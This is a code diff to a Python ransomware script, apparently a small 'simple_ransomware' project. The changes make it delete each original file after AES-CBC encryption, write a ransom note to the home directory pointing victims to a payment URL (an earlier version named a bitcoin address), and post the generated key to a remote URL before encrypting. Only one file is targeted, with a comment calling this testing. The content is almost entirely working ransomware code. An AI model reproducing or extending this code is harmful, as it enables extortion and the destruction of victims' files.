@@ -37,7 +37,7 @@ def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
 
     if not out_filename:
         out_filename = in_filename + '.nile'
-
+    #encrypt the file
     iv = os.urandom(16)
     encryptor = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend()).encryptor()
 
@@ -54,19 +54,32 @@ def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
                 outfile.write(encryptor.update(chunk))
 
             outfile.write(encryptor.finalize())
+    deleteFile(in_filename)
+
+#This function will delete the original file.
+def deleteFile(filename):
+    #Delete the original file.
+    os.remove(filename)
+
 
 
 
 #This function will create a ransom note.
-def ransomNote():
+def ransomNote(url):
     #If ransome note already exists, then do nothing.
     if os.path.exists("README.txt"):
         return
     #Else, create ransom note.
     else:
+        #Create txt file with the key.
         #create readme.txt file
-        f = open("README.txt", "w")
-        f.write("Your files have been encrypted. To decrypt your files, you must send 32 bitcoin to this address: 1JwSSubhmg6iPtRjtyqhUYYH7oPtQSNwBo")
+        #Get the home directory.
+        home = os.path.expanduser("~")
+        #Change to the home directory.
+        os.chdir(home)
+        #Create the ransom note.
+        f = open("README.txt", "w", encoding="utf-8")
+        f.write("Your files have been encrypted. To decrypt your files, you must go to this website: " + url + " and enter the key that was sent to you via email.")
         f.close()
 
 #This function will send the key to us via https post request.
@@ -97,19 +110,21 @@ def createKey():
     key = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))
     return key
 
+
+
 def main():
-    key = createKey()
-    print(key)
-    #Get url to send key to from command line as an argument.
-    #If no argument is given, then use ask for the url.
     if len(sys.argv) == 1:
         url = input("Enter the url to send the key to: ")
     else:
         url = sys.argv[0]
+    
+    key = createKey()
     sendKey(key, url)
-    ransomNote()
+    ransomNote(url)
     #Encrypt only 1 file for testing purposes.
-    encrypt_file(key, 'file1.txt')
+    encrypt_file(key, '/workspaces/simple_ransomware/file1.txt')
+    #Get url to send key to from command line as an argument.
+    #If no argument is given, then use ask for the url.
     #deleteScript()
 
 if __name__ == '__main__':
